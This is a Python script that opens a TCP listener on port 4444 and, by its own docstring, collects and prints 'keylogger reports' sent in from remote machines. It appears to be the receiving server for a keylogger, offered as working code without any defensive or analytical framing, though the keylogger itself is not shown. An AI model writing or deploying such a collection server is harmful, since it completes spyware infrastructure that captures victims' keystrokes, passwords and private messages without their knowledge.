import socket

HOST = "192.168.1.1"
PORT = 4444

def start_listener():
    """Starts the TCP server to listen for and display keylogger reports."""
    
    # Create a socket object using IPv4 and TCP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        
        # Allows reuse of the address so you can restart the script quickly
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Listening for connections on {HOST}:{PORT}")
        
        while True:
            try:
                # Accept an incoming connection
                conn, addr = s.accept()
                with conn:
                    print(f"\n[--- CONNECTION RECEIVED from {addr[0]} ---]")
                    
                    # Receive the data (max 10KB)
                    data = conn.recv(10240).decode('utf-8') 
                    
                    if data:
                        print(data)
                        print("[--- END OF REPORT ---]\n")
                        
            except KeyboardInterrupt:
                print("\n[*] Listener shutting down.")
                break
            except Exception as e:
                print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    start_listener()